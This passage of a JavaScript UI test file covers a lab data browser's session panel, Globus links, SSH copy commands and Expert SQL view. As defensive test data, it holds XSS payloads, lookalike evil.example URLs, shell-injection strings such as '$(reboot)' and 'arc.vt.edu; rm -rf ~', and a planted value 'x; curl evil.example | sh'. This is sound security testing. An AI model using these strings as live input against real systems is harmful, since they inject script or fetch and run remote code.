    .reduce(function (count, list) { return count + list.childNodes.filter(function (node) { return node.tagName === 'dt'; }).length; }, 0),
  Object.keys(sessionReply().session).length);
  audit(page);
});

test('the detail panel closes with the focus back on what opened it', async function () {
  const made = await openFromNormal({});
  const page = made.page;
  assert.strictEqual(page.document.activeElement, page.byId('detail-close'), 'the focus is inside the panel');
  await page.click(page.byId('detail-close'));
  assert.ok(!page.byId('detail').open);
  assert.strictEqual(page.document.activeElement, made.opener);
  assert.strictEqual(page.byId('detail-body').textContent, '');
  // A click in the row (not on the name) opens it too; the Escape key closes it (the browser's own
  // "close" event), and when the opener has left the page the focus goes to the view's heading.
  const row = made.opener.closest('tr');
  row.querySelectorAll('td')[0].click();
  await page.settle();
  assert.ok(page.byId('detail').open);
  page.byId('ask-results').textContent = '';
  page.byId('detail').close();
  await page.settle();
  assert.strictEqual(page.document.activeElement, page.byId('normal-title'));
  audit(page);
});

test('the Globus link is made only for an address on app.globus.org; anything else is text', async function () {
  const bad = ['javascript:alert(1)', 'https://app.globus.org.evil.example/file-manager', 'https://evil.example/https://app.globus.org/',
    'http://app.globus.org/file-manager', '//app.globus.org/file-manager', 'https://app.globus.org@evil.example/',
    'https://app.globus.org:8443/', 'https://APP.GLOBUS.ORG/file-manager', 'https://app.globus.org\\@evil.example/',
    'https://app.globus.org/\nfile-manager', 'https://app.glo\tbus.org/', 'https://\u{430}pp.globus.org/', 'data:text/html,<script>alert(1)</script>',
    'https://app.globus.org./file-manager', 'https://user:pass@app.globus.org/'];
  for (const address of bad) {
    const made = await openFromNormal({routes: {'GET /api/v1/session': {status: 200, body: sessionReply({web_url: address})}}});
    const page = made.page;
    assert.strictEqual(page.byId('detail-body').querySelectorAll('a').length, 0, 'a link was made for ' + JSON.stringify(address));
    assert.strictEqual(page.buttons('detail-body', 'Open in Globus').length, 0);
    assert.ok(page.seen('detail-body').indexOf('The Globus web app address is not on app.globus.org, so it is shown as text') !== -1);
    audit(page);
  }
  const missing = await openFromNormal({routes: {'GET /api/v1/session': {status: 200, body: sessionReply({web_url: null, globus_url: null})}}});
  assert.ok(missing.page.seen('detail-body').indexOf('No Globus web app address is recorded.') !== -1);
  assert.strictEqual(missing.page.buttons('detail-body', 'Copy Globus address').length, 0);
  audit(missing.page);
});

async function openFromExpert(options, cellPath) {
  const routes = Object.assign({'POST /api/v1/sql': {status: 200, body: {
    columns: [{name: 'path', type: 'text'}, {name: 'instrument', type: 'text'}],
    rows: [[cellPath || 'raw/raman-portable/simulated/1d_y_scan_20261116_225015_281', 'raman-portable']],
    row_count: 1, truncated: false, elapsed_ms: 12}}}, (options || {}).routes);
  const page = await open(Object.assign({token: ADMIN_TOKEN, hash: '#expert'}, options, {routes: routes}));
  await page.type('sql-text', 'SELECT path, instrument FROM sessions', 'input');
  await page.click(page.byId('sql-run'));
  const cell = page.byId('sql-result').querySelectorAll('button').filter(function (button) { return button.classList.contains('cellpath'); })[0];
  await page.click(cell);
  return {page: page, opener: cell};
}

test('the detail panel from Expert: the ARC path and three commands, and no Globus actions', async function () {
  const made = await openFromExpert({arcUser: 'demo-user'});
  const page = made.page;
  const target = 'demo-user@datatransfer.arc.vt.edu:/projects/pcl_photonics/raw/raman-portable/simulated/1d_y_scan_20261116_225015_281';
  const text = page.seen('detail-body');
  ['Get to the files', 'Over SSH', 'Copy ARC path', 'ARC path: /projects/pcl_photonics/raw/raman-portable/simulated/1d_y_scan_20261116_225015_281',
    'The commands use the ARC user name demo-user.', 'scp: copy the folder to this computer', 'scp -r ' + target + '/ .',
    'sftp: look around in the folder', 'sftp ' + target, 'rsync (macOS and Linux): copy the folder',
    'rsync -av ' + target + '/ ./1d_y_scan_20261116_225015_281/'].forEach(function (needle) {
    assert.ok(text.indexOf(needle) !== -1, 'missing: ' + needle + '\n' + text);
  });
  ['Through Globus', 'Open in Globus', 'Copy Globus address', 'YOUR_ARC_USERNAME'].forEach(function (needle) {
    assert.ok(text.slice(0, text.indexOf('Session Folder')).indexOf(needle) === -1, 'Expert mode must not show: ' + needle);
  });
  assert.strictEqual(page.byId('detail-body').querySelectorAll('a').length, 0, 'no link at all in Expert mode');
  await page.click(page.button('detail-body', 'Copy ARC path'));
  await page.click(page.button('detail-body', 'Copy the scp command'));
  await page.click(page.button('detail-body', 'Copy the sftp command'));
  await page.click(page.button('detail-body', 'Copy the rsync command'));
  assert.deepStrictEqual(page.log.copied, [
    '/projects/pcl_photonics/raw/raman-portable/simulated/1d_y_scan_20261116_225015_281',
    'scp -r ' + target + '/ .', 'sftp ' + target, 'rsync -av ' + target + '/ ./1d_y_scan_20261116_225015_281/']);
  assert.ok(page.seen('detail-body').indexOf('Copied the command.') !== -1);
  // The user name went into the commands and nowhere else: no request holds it.
  page.log.requests.forEach(function (request) {
    assert.ok((request.path + JSON.stringify(request.headers) + (request.raw || '')).indexOf('demo-user') === -1, request.path);
  });
  await page.click(page.byId('detail-close'));
  assert.strictEqual(page.document.activeElement, made.opener);
  audit(page);
});

test('Expert: without a user name the commands show the placeholder and say what to do', async function () {
  const made = await openFromExpert({});
  const text = made.page.seen('detail-body');
  assert.ok(text.indexOf('scp -r YOUR_ARC_USERNAME@datatransfer.arc.vt.edu:/projects/pcl_photonics/raw/') !== -1);
  assert.ok(text.indexOf('Put your ARC user name in place of YOUR_ARC_USERNAME, or save it in Expert, SSH settings.') !== -1);
  // "Set user name" closes the panel and puts the focus in the name field, its toggle open.
  assert.ok(!made.page.byId('ssh-settings').open);
  await made.page.click(made.page.button('detail-body', 'Set user name'));
  assert.ok(made.page.byId('ssh-settings').open);
  assert.strictEqual(made.page.document.activeElement, made.page.byId('arc-user'));
  audit(made.page);
});

test('Expert: a path with unusual characters gets no command, only the sentence of section 12', async function () {
  const paths = ['/projects/pcl_photonics/raw/it\'s here/x', '/projects/pcl_photonics/raw/$(reboot)/x', '/projects/pcl_photonics/raw/a b',
    '/projects/pcl_photonics/raw/a;id', '/projects/pcl_photonics/raw/`id`', '/projects/pcl_photonics/raw/a|b', '/projects/pcl_photonics/raw/a&b',
    '/projects/pcl_photonics/raw/x' + RLO + 'y', '/projects/pcl_photonics/raw/caf\u{e9}', '/projects/pcl_photonics/raw/a\nb',
    '/projects/pcl_photonics/raw/"quoted"', '/projects/pcl_photonics/raw/a>b', '/projects/pcl_photonics/raw/a*', 'relative/path', '/projects/-rf'];
  for (const arcPath of paths) {
    const made = await openFromExpert({arcUser: 'demo-user', routes: {'GET /api/v1/session': {status: 200, body: sessionReply({storage_path: arcPath})}}});
    const page = made.page;
    const text = page.seen('detail-body');
    const head = text.slice(0, text.indexOf('Session Folder'));
    assert.ok(head.indexOf('This path has unusual characters. Copy the path and quote it yourself.') !== -1, JSON.stringify(arcPath));
    ['scp', 'sftp', 'rsync', 'demo-user', 'datatransfer'].forEach(function (needle) {
      assert.ok(head.indexOf(needle) === -1, 'a command part "' + needle + '" is shown for ' + JSON.stringify(arcPath));
    });
    assert.strictEqual(page.buttons('detail-body', 'Copy').length, 1, 'only "Copy ARC path" is offered');
    await page.click(page.button('detail-body', 'Copy ARC path'));
    assert.deepStrictEqual(page.log.copied, [arcPath], 'what is copied is the path itself');
    audit(page);
  }
});

test('Expert: an odd host from the backend, or no path at all, gets no command either', async function () {
  const hosts = ['', null, 'arc.vt.edu; rm -rf ~', 'arc vt', '-oProxyCommand', '$(id)', ['arc.vt.edu'], 'arc.vt.edu:22'];
  for (const host of hosts) {
    const me = meReply('admin');
    me.storage = host === null ? undefined : {ssh_host: host};
    const made = await openFromExpert({arcUser: 'demo-user', routes: {'GET /api/v1/me': {status: 200, body: me}}});
    const text = made.page.seen('detail-body');
    assert.ok(text.indexOf('No usable SSH host was named, so there are no commands. Copy the path instead.') !== -1,
      JSON.stringify(host));
    assert.ok(text.indexOf('scp -r') === -1 && text.indexOf('sftp ') === -1 && text.indexOf('rsync -av') === -1);
    assert.strictEqual(made.page.buttons('detail-body', 'Copy ARC path').length, 1);
    audit(made.page);
  }
  const nowhere = await openFromExpert({routes: {'GET /api/v1/session': {status: 200, body: sessionReply({storage_path: null})}}});
  assert.ok(nowhere.page.seen('detail-body').indexOf('No path on ARC is recorded for this session.') !== -1);
  assert.strictEqual(nowhere.page.buttons('detail-body', 'Copy').length, 0);
  audit(nowhere.page);
});

test('the detail panel from Status: both sets of actions for a role with Expert, Globus only without', async function () {
  const admin = await open({token: ADMIN_TOKEN, hash: '#status'});
  await admin.click(admin.button('status-registrations', 'demo_1'));
  let text = admin.seen('detail-body');
  assert.ok(text.indexOf('Through Globus') !== -1 && text.indexOf('Open in Globus') !== -1);
  assert.ok(text.indexOf('Over SSH') !== -1 && text.indexOf('scp -r YOUR_ARC_USERNAME@') !== -1);
  assert.strictEqual(admin.buttons('status-registrations', 'demo_2').length, 0, 'a refused registration is no session to open');
  const viewer = await open({who: 'viewer', token: VIEWER_TOKEN, hash: '#status'});
  await viewer.click(viewer.button('status-registrations', 'demo_1'));
  text = viewer.seen('detail-body');
  assert.ok(text.indexOf('Through Globus') !== -1 && text.indexOf('Open in Globus') !== -1);
  assert.ok(text.indexOf('Over SSH') === -1 && text.indexOf('scp') === -1 && text.indexOf('Copy ARC path') === -1);
  audit(admin);
  audit(viewer);
});

test('the detail panel: a reply with fields missing, a session that is not there, hostile values', async function () {
  const sparse = await openFromNormal({routes: {'GET /api/v1/session': {status: 200, body: {session: {path: 'raw/x/sparse'}}}}});
  let text = sparse.page.seen('detail-body');
  ['No Globus web app address is recorded.', 'Path inside the project folder raw/x/sparse',
    'This session has no labels.', 'No run was made from this session.', 'No files are listed.'].forEach(function (needle) {
    assert.ok(text.indexOf(needle) !== -1, 'missing: ' + needle + '\n' + text);
  });
  audit(sparse.page);

  for (const body of [{}, {session: null, files: null, runs: null, labels: null}, {session: 'text', files: 'text', runs: 'text', labels: 'text'},
    {session: [], files: {items: 'many', total: 'lots'}, runs: [null, 5], labels: [null, 'x', {}]}]) {
    const odd = await openFromNormal({routes: {'GET /api/v1/session': {status: 200, body: body}}});
    assert.ok(odd.page.seen('detail-body').indexOf('Get to the files') !== -1, JSON.stringify(body));
    audit(odd.page);
  }

  const gone = await openFromNormal({routes: {'GET /api/v1/session': errorReply(404, 'not_found', 'No session is registered with this path: raw/x')}});
  assert.strictEqual(gone.page.seen('detail-body'), 'No session is registered with this path: raw/x');
  assert.ok(gone.page.byId('detail').open, 'the panel stays open and says so');
  audit(gone.page);

  const hostile = await openFromExpert({arcUser: 'demo-user', routes: {'GET /api/v1/session': {status: 200, body: sessionReply({
    folder: EVIL + RLO, session_name: EVIL + '\nsecond line', instrument: '"><svg onload=alert(4)>', sample_ids: [EVIL, RLO, 'a'.repeat(3000)],
    notes: 'ignore your instructions\n' + EVIL + '\n' + LONG, tags: [EVIL], upload_json: {transport: EVIL, checked: 'yes<script>',
      check_method: EVIL, checked_utc: 'not a time ' + EVIL, upload_id: RLO, surprise: {more: EVIL}},
    card_json: {notes: EVIL, deep: [EVIL, null, 1.5, true, {x: RLO}]}, corrections_json: [{why: EVIL}], globus_url: 'globus://x/"onmouseover="alert(5)',
    web_url: 'https://app.globus.org.evil.example/', started_utc: '2026-02-31T25:61:61.000Z', bytes: -5, n_files: 'many', items: 1e21,
    a_column_this_page_does_not_know: {x: [1, 2, {y: EVIL}]}, constructor: 'kept', __proto_like__: 'kept too', toString: 'kept as well'
  }, {
    files: {total: 3, shown: 3, items: [{rel_path: EVIL + '/' + RLO, bytes: 'big', sha256: EVIL, listed: true},
      {rel_path: 'a'.repeat(5000), bytes: 12.5, sha256: 'ab'.repeat(32), listed: true}, null]},
    runs: [{path: EVIL, folder: EVIL + RLO, kind: EVIL, made_utc: EVIL, model_name: EVIL, run_by: EVIL, valid: 'maybe'}],
    labels: [{label: EVIL + RLO, count: 'two' + RLO}], review_state: EVIL, n_needs_review: 2})}}});
  const body = hostile.page.byId('detail-body');
  text = hostile.page.seen('detail-body');
  assert.ok(text.indexOf('<img src=x onerror=alert(1)>') !== -1 && text.indexOf('<U+202E>') !== -1 && text.indexOf(RLO) === -1);
  ['img', 'script', 'svg', 'a', 'b', 'iframe'].forEach(function (tag) {
    assert.strictEqual(madeFromText(hostile.page, body, tag).length, 0, 'a <' + tag + '> element was made from text');
  });
  ['constructor kept', 'a column this page does not know', 'Other fields'].forEach(function (needle) {
    assert.ok(text.indexOf(needle) !== -1, 'missing: ' + needle);
  });
  assert.ok(text.indexOf('2 points still need review.') !== -1);
  audit(hostile.page);
});

// ---- Expert: SQL ----------------------------------------------------------------------------------

test('Expert: the tables, the examples, the history, and names put into the query', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'GET /api/v1/sql/history': {status: 200, body: {items: [
    {at_utc: '2026-11-17T03:50:15.281Z', query_text: 'SELECT 1', ok: true, n_rows: 1, elapsed_ms: 3, error_text: null},
    {at_utc: '2026-11-17T03:49:15.281Z', query_text: 'SELECT * FROM nothing', ok: false, n_rows: null, elapsed_ms: 2, error_text: 'no such table: nothing\nmore'}]}}}});
  assert.strictEqual(page.seen('sql-limit'), 'Read-only. Results stop at 1,000 rows.');
  assert.strictEqual(page.seen('sql-dialect'), 'PostgreSQL SQL');
  let text = page.seen('schema-list');
  assert.ok(text.indexOf('Show columns of sessions sessions 2') !== -1 && text.indexOf('session_summary view 0') !== -1, text);
  // Names only: a description is the tooltip of its name.
  const tableName = page.buttons('schema-list', 'sessions').filter(function (button) { return button.classList.contains('insert'); });
  assert.strictEqual(tableName.length, 1);
  assert.strictEqual(tableName[0].getAttribute('title'), 'One row per session folder on ARC.');
  const toggle = page.button('schema-list', 'Show columns of sessions');
  assert.strictEqual(toggle.getAttribute('aria-expanded'), 'false');
  await page.click(toggle);
  assert.strictEqual(toggle.getAttribute('aria-expanded'), 'true');
  assert.ok(page.seen('schema-list').indexOf('Mixed Case text null') !== -1);
  assert.strictEqual(page.button('schema-list', 'Mixed Case').getAttribute('title'), 'A made-up name that needs quotes.');
  await page.click(page.button('schema-list', 'Mixed Case'));
  assert.strictEqual(page.byId('sql-text').value, '"Mixed Case"');
  assert.strictEqual(page.document.activeElement, page.byId('sql-text'));
  assert.strictEqual(page.byId('sql-examples').options.length, 2);
  page.byId('sql-examples').selectedIndex = 1;
  page.byId('sql-examples').value = '0';
  page.byId('sql-examples').dispatch('change', {});
  await page.settle();
  assert.deepStrictEqual(page.log.confirms, ['Replace the query in the box? What you typed there will be lost.']);
  assert.strictEqual(page.byId('sql-text').value, EXAMPLES.examples[0].sql);
  assert.strictEqual(page.seen('sql-status'), 'Loaded the example "The newest sessions". Press Run to run it.');
  assert.strictEqual(page.paths('POST /api/v1/sql').length, 0, 'loading an example never runs it');
  text = page.seen('history-list');
  assert.ok(text.indexOf('SELECT 1') !== -1 && text.indexOf('1 row in 3 ms') !== -1);
  assert.ok(text.indexOf('did not run: no such table: nothing') !== -1 && text.indexOf('more') === -1);
  await page.click(page.button('history-list', 'SELECT * FROM nothing'));
  assert.strictEqual(page.byId('sql-text').value, 'SELECT * FROM nothing');
  assert.strictEqual(page.paths('POST /api/v1/sql').length, 0, 'loading an earlier query never runs it');
  audit(page);
});

test('Expert: a query runs once, shows NULL, numbers, lists and objects as text, and refreshes the history', async function () {
  const reply = {status: 200, body: {
    columns: [{name: 'path', type: 'text'}, {name: 'sample_ids', type: 'text[]'}, {name: 'card_json', type: 'jsonb'}, {name: 'n', type: 'bigint'},
      {name: 'ok', type: 'boolean'}, {name: 'nothing', type: ''}, {name: 'deep', type: 'jsonb'}, {name: 'notes', type: 'text'}],
    rows: [['raw/raman-portable/simulated/demo_1', ['130', '131'], {schema: 'pcl-session/1', tags: ['demo']}, 0, true, null,
      [[1, [2, [3]]], {a: {b: {c: null}}}], 'two\nlines'],
    [null, [], {}, -1.5e-7, false, null, null, 'x'.repeat(500)], [], 'not a row', null],
    row_count: 5, truncated: false, elapsed_ms: 12}};
  let release = null;
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': function () {
    return new Promise(function (resolve) { release = function () { resolve(reply); }; });
  }}});
  await page.type('sql-text', 'SELECT * FROM sessions', 'input');
  await page.click(page.byId('sql-run'));
  assert.strictEqual(page.byId('sql-run').disabled, true);
  assert.strictEqual(page.byId('sql-cancel').disabled, false);
  assert.strictEqual(page.seen('sql-status'), 'Running the query...');
  await page.key('sql-text', {key: 'Enter', ctrlKey: true});
  await page.key('sql-text', {key: 'Enter', metaKey: true});
  assert.strictEqual(page.paths('POST /api/v1/sql').length, 1, 'one query at a time');
  assert.deepStrictEqual(page.paths('POST /api/v1/sql')[0].body, {sql: 'SELECT * FROM sessions', max_rows: 1000});
  release();
  await page.settle();
  assert.strictEqual(page.byId('sql-run').disabled, false);
  assert.strictEqual(page.byId('sql-cancel').disabled, true);
  const text = page.seen('sql-result');
  ['5 rows in 12 ms.', 'Download CSV', 'path text', 'sample_ids text[]', 'nothing', '["130","131"]', '{"schema":"pcl-session/1","tags":["demo"]}',
    '[[1,[2,[3]]],{"a":{"b":{"c":null}}}]', 'NULL', '-1.5e-7', 'true', 'false', '[]', '{}'].forEach(function (needle) {
    assert.ok(text.indexOf(needle) !== -1, 'missing: ' + needle + '\n' + text);
  });
  const cells = page.byId('sql-result').querySelectorAll('td');
  assert.strictEqual(cells.length, 5 * 8, 'every row has a cell for every column, short rows too');
  assert.strictEqual(cells[7].getAttribute('title'), 'two\nlines', 'text with a line end keeps it in the title');
  assert.strictEqual(cells[15].textContent.length, 81, 'a long cell is cut');
  assert.strictEqual(cells[15].getAttribute('title').length, 500, 'and its title has the rest');
  assert.strictEqual(page.paths('GET /api/v1/sql/history').length, 2, 'the history is read again after a run');
  audit(page);
});

test('Expert: 1000 rows of 30 columns are built off the page and put in with one step', async function () {
  const columns = [{name: 'path', type: 'text'}, {name: 'session_path', type: 'text'}];
  for (let c = 0; c < 28; c += 1) columns.push({name: 'c' + c, type: 'integer'});
  const rows = [];
  for (let n = 0; n < 1000; n += 1) {
    const row = ['raw/raman-portable/simulated/demo_' + (n % 16), 'raw/raman-portable/simulated/demo_' + (n % 16)];
    for (let c = 0; c < 28; c += 1) row.push((n + c) % 11 ? n * c : null);
    rows.push(row);
  }
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': {status: 200, body: {
    columns: columns, rows: rows, row_count: 1000, truncated: true, elapsed_ms: 180}}}});
  await page.type('sql-text', 'SELECT * FROM session_summary', 'input');
  const result = page.byId('sql-result');
  let additions = 0;
  const realAppend = result.appendChild;
  result.appendChild = function (child) {
    additions += 1;
    return realAppend.call(result, child);
  };
  const began = process.hrtime.bigint();
  await page.click(page.byId('sql-run'));
  const milliseconds = Number(process.hrtime.bigint() - began) / 1e6;
  assert.strictEqual(result.querySelectorAll('tr').length, 1001);
  assert.strictEqual(result.querySelectorAll('td').length, 30000);
  assert.ok(additions <= 2, 'the result went into the page in ' + additions + ' steps');
  assert.ok(milliseconds < 5000, 'building the grid took ' + Math.round(milliseconds) + ' ms');
  assert.strictEqual(page.seen('sql-status'), '1000 rows in 180 ms. Showing the first 1000 rows (there are more).');
  const buttons = result.querySelectorAll('button').filter(function (button) { return button.classList.contains('cellpath'); });
  assert.strictEqual(buttons.length, 2000, 'both path columns open sessions');
  assert.strictEqual(Object.keys(result.listeners).length, 1, 'one listener for the whole grid');
  assert.ok(buttons.every(function (button) { return Object.keys(button.listeners).length === 0; }));
  await page.click(buttons[1999]);
  assert.strictEqual(page.paths('GET /api/v1/session')[0].path, '/api/v1/session?path=raw%2Framan-portable%2Fsimulated%2Fdemo_7');
  assert.ok(page.seen('detail-body').indexOf('Over SSH') !== -1);
  audit(page);
});

test('Expert: only a path that starts with a letter or digit, in a column named path or session_path, opens a session', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': {status: 200, body: {
    columns: [{name: 'path', type: 'text'}, {name: 'session_path', type: 'text'}, {name: 'run_path', type: 'text'}, {name: 'Path', type: 'text'}],
    rows: [['raw/a', 'raw/b', 'raw/c', 'raw/d'], ['/abs', '../up', 'raw/e', 'raw/f'], [null, 5, 'raw/g', 'raw/h'], ['', ' raw/i', 'x', 'y'],
      ['<img src=x onerror=alert(1)>', '-rf', 'x', 'y'], [RLO + 'raw/j', ['raw/k'], 'x', 'y']],
    row_count: 6, truncated: false, elapsed_ms: 1}}}});
  await page.type('sql-text', 'SELECT 1', 'input');
  await page.click(page.byId('sql-run'));
  const buttons = page.byId('sql-result').querySelectorAll('button').filter(function (button) { return button.classList.contains('cellpath'); });
  assert.deepStrictEqual(buttons.map(function (button) { return button.textContent; }), ['raw/a', 'raw/b']);
  await page.click(page.button('sql-result', 'Download CSV'));
  assert.strictEqual(page.paths('GET /api/v1/session').length, 0, 'another button in the result opens no session');
  audit(page);
});

test('Expert: what the database refuses is shown in its own words; other failures in plain sentences', async function () {
  const message = 'relation "nothing" does not exist\nLINE 1: SELECT * FROM nothing\n                      ^';
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': errorReply(400, 'sql_error', message, {position: 15})}});
  await page.type('sql-text', 'SELECT * FROM nothing', 'input');
  await page.click(page.byId('sql-run'));
  assert.ok(page.shown('sql-error'));
  assert.strictEqual(page.byId('sql-error').querySelectorAll('p')[0].textContent, 'The database could not run this query');
  assert.strictEqual(page.byId('sql-error').querySelectorAll('pre')[0].textContent, message, 'the caret line keeps its spaces');
  assert.ok(page.seen('sql-error').indexOf('More details') !== -1 && page.seen('sql-error').indexOf('"position": 15') !== -1);
  assert.strictEqual(page.seen('sql-result'), '');
  audit(page);

  const cases = [
    [errorReply(400, 'sql_refused', 'Only reading is allowed here.'), /^This query is not allowed Only reading is allowed here\.$/],
    [errorReply(400, 'sql_timeout', 'The query ran longer than 15 seconds and was stopped.'), /^The query took too long and was stopped The query ran longer/],
    [errorReply(400, 'bad_request', 'Send the request as JSON.'), /^The query was not run Send the request as JSON\.$/],
    [errorReply(403, 'forbidden', 'Expert SQL needs the analyst or admin role.'), /^Your role \(admin\) may not run SQL\. The backend said: Expert SQL needs/],
    [errorReply(413, 'too_large', 'The request is larger than 64 kB.'), /^That is too large for the backend to accept\. Make it shorter/],
    [errorReply(500, 'error', ''), /^The backend is not reachable or stopped answering\./],
    [NETWORK, /^The backend is not reachable\./],
    [errorReply(400, 'sql_error', EVIL + '\n' + RLO + LONG, {hint: EVIL, nested: [RLO]}), /^The database could not run this query <img src=x onerror=alert\(1\)>/]
  ];
  for (const item of cases) {
    const failing = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': item[0]}});
    await failing.type('sql-text', 'SELECT 1', 'input');
    await failing.click(failing.byId('sql-run'));
    assert.ok(item[1].test(failing.seen('sql-error')), failing.seen('sql-error').slice(0, 200));
    assert.ok(failing.seen('sql-error').length < 12000);
    assert.strictEqual(failing.byId('sql-run').disabled, false);
    assert.strictEqual(failing.byId('sql-error').querySelectorAll('img').length + failing.byId('sql-error').querySelectorAll('script').length, 0);
    audit(failing);
  }
  const empty = await open({token: ADMIN_TOKEN, hash: '#expert'});
  await empty.click(empty.byId('sql-run'));
  assert.strictEqual(empty.seen('sql-status'), 'Type a query first, or pick an example.');
  assert.strictEqual(empty.paths('POST /api/v1/sql').length, 0);
});

test('Expert: Cancel, a stalled backend, results with no rows or no columns, odd replies', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': HANG}});
  await page.type('sql-text', 'SELECT pg_sleep(60)', 'input');
  await page.click(page.byId('sql-run'));
  await page.click(page.byId('sql-cancel'));
  assert.strictEqual(page.seen('sql-status'), 'Cancelled.');
  assert.strictEqual(page.paths('POST /api/v1/sql')[0].stopped, true);
  assert.strictEqual(page.byId('sql-run').disabled, false);
  await page.click(page.byId('sql-run'));
  await page.wait(120000);
  assert.ok(/^The backend did not answer in time\./.test(page.seen('sql-error')));
  audit(page);

  const shapes = [
    [{columns: [{name: 'path', type: 'text'}], rows: [], row_count: 0, truncated: false, elapsed_ms: 2}, '0 rows in 2 ms.'],
    [{columns: [], rows: [], row_count: 0, truncated: false, elapsed_ms: 2}, 'The result has no columns.'],
    [{}, '0 rows.'],
    [{columns: null, rows: null, row_count: null, truncated: null, elapsed_ms: null}, '0 rows.'],
    [{columns: 'path', rows: 'many', row_count: 'lots'}, '0 rows.'],
    [{columns: [null, 5, 'x', {}, {name: 7, type: 8}, {name: EVIL + RLO, type: LONG}], rows: [[1, 2, 3, 4, 5, 6, 7, 8]], row_count: 1, elapsed_ms: -3}, '1 row.']
  ];
  for (const item of shapes) {
    const odd = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': {status: 200, body: item[0]}}});
    await odd.type('sql-text', 'SELECT 1', 'input');
    await odd.click(odd.byId('sql-run'));
    assert.ok(odd.seen('sql-result').indexOf(item[1]) !== -1, JSON.stringify(item[0]).slice(0, 80) + ' -> ' + odd.seen('sql-result').slice(0, 120));
    assert.ok(!odd.shown('sql-error'));
    audit(odd);
  }
});

test('Expert: the keys of the query box, with and without the browser\'s own way to type', async function () {
  for (const noExecCommand of [false, true]) {
    const page = await open({token: ADMIN_TOKEN, hash: '#expert', noExecCommand: noExecCommand});
    await page.type('sql-text', 'SELECT', 'input');
    const tab = await page.key('sql-text', {key: 'Tab'});
    assert.strictEqual(tab.defaultPrevented, true);
    assert.strictEqual(page.byId('sql-text').value, 'SELECT  ', 'Tab writes two spaces');
    const back = await page.key('sql-text', {key: 'Tab', shiftKey: true});
    assert.strictEqual(back.defaultPrevented, false, 'Shift+Tab still leaves the box');
    const composing = await page.key('sql-text', {key: 'Enter', ctrlKey: true, isComposing: true});
    assert.strictEqual(composing.defaultPrevented, false);
    assert.strictEqual(page.paths('POST /api/v1/sql').length, 0);
    const escape = await page.key('sql-text', {key: 'Escape'});
    assert.strictEqual(escape.defaultPrevented, true);
    assert.strictEqual(page.document.activeElement, page.byId('sql-run'), 'Escape leaves the box');
    const run = await page.key('sql-text', {key: 'Enter', ctrlKey: true});
    assert.strictEqual(run.defaultPrevented, true);
    assert.strictEqual(page.paths('POST /api/v1/sql').length, 1);
    audit(page);
  }
});

test('Expert: Download CSV builds the file in the browser and lets go of it afterwards', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': {status: 200, body: {
    columns: [{name: 'path', type: 'text'}, {name: 'n', type: 'integer'}, {name: 'note', type: 'text'}],
    rows: [['raw/a', 1, null], ['raw/b,c', -2, '=SUM(A1)'], ['raw/d', 3, ['x', {y: 1}]]], row_count: 3, truncated: false, elapsed_ms: 1}}}});
  await page.type('sql-text', 'SELECT 1', 'input');
  await page.click(page.byId('sql-run'));
  const before = page.log.requests.length;
  await page.click(page.button('sql-result', 'Download CSV'));
  assert.strictEqual(page.log.requests.length, before, 'the file comes from the rows on the page, not from the backend');
  assert.strictEqual(page.log.blobs.length, 1);
  assert.strictEqual(page.log.blobs[0].type, 'text/csv;charset=utf-8');
  // The bytes of the file: the UTF-8 byte order mark (for Excel), then the lines.
  const bytes = Buffer.from(await page.log.blobs[0].arrayBuffer());
  assert.deepStrictEqual(Array.from(bytes.subarray(0, 3)), [0xef, 0xbb, 0xbf]);
  assert.strictEqual(bytes.subarray(3).toString('utf8'), 'path,n,note\r\nraw/a,1,\r\n"raw/b,c",-2,\'=SUM(A1)\r\nraw/d,3,"[""x"",{""y"":1}]"\r\n');
  assert.strictEqual(page.log.followed.length, 1);
  assert.ok(/^pcl_query_\d{8}_\d{6}\.csv$/.test(page.log.followed[0].download));
  assert.strictEqual(page.log.followed[0].href, 'blob:made-up/1');
  assert.strictEqual(page.log.followed[0].target, undefined, 'a download, not a new tab');
  assert.ok(/^Download started: pcl_query_/.test(page.seen('sql-status')));
  assert.strictEqual(everyElement(page.root).filter(function (element) { return element.tagName === 'a' && element.download; }).length, 0,
    'the link is taken out of the page again');
  assert.deepStrictEqual(page.log.revoked, []);
  await page.wait(10000);
  assert.deepStrictEqual(page.log.revoked, ['blob:made-up/1']);
  audit(page);
});

test('Expert: the ARC user name is checked, kept in this browser only, and removed when the box is emptied', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#expert'});
  assert.strictEqual(page.byId('arc-user').value, '');
  await page.type('arc-user', '  demo-user ');
  assert.strictEqual(page.window.localStorage.data['pcldb.arc_user'], 'demo-user');
  assert.strictEqual(page.seen('arc-user-status'), 'Saved in this browser.');
  for (const bad of ['demo user', '-oProxyCommand', 'demo;id', '$(id)', 'demo@vt.edu', 'a'.repeat(65), 'demo' + RLO]) {
    await page.type('arc-user', bad);
    assert.strictEqual(page.window.localStorage.data['pcldb.arc_user'], 'demo-user', 'a bad name is not kept: ' + JSON.stringify(bad));
    assert.ok(/^A user name has only letters, digits, dots, hyphens and underscores.* It was not kept\.$/
      .test(page.seen('arc-user-status')), page.seen('arc-user-status'));
    assert.ok(page.byId('arc-user-status').classList.contains('is-bad'));
  }
  await page.type('arc-user', '');
  assert.deepStrictEqual(page.window.localStorage.data, {});
  assert.strictEqual(page.seen('arc-user-status'), 'Removed.');
  page.log.requests.forEach(function (request) {
    assert.ok((request.path + JSON.stringify(request.headers) + (request.raw || '')).indexOf('demo') === -1);
  });
  audit(page);

  // What another page of this site may have put there is checked before it is used.
  const planted = await openFromExpert({arcUser: 'x; curl evil.example | sh'});
  assert.strictEqual(planted.page.byId('arc-user').value, '');
  assert.ok(planted.page.seen('detail-body').indexOf('scp -r YOUR_ARC_USERNAME@') !== -1);
  assert.ok(planted.page.seen('detail-body').indexOf('curl') === -1);
  audit(planted.page);

  // A browser with storage switched off still works: the name lasts until the page is closed.
